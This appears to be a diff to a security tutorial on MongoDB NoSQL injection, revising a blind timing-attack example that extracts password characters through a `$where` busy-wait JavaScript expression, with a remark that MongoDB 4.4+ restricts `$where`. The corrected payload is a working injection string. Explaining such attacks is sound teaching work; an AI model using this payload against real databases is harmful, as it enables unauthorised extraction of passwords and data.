@@ -195,9 +195,9 @@ MongoDB's `$where` evaluates JavaScript expressions:
 ```
 If the response takes 5 seconds, the condition is true.
 
-**Data extraction via timing**:
+**Data extraction via timing** (busy-wait, since `sleep()` is shell-only):
 ```json
-{"$where": "this.password.charAt(0) === 'a' && sleep(5000)"}
+{"$where": "this.password.charAt(0) === 'a' && (function(){var s=new Date();while(new Date()-s<5000);return true})()"}
 ```
 
 Note: Modern MongoDB (4.4+) restricts `$where` by default. But older versions
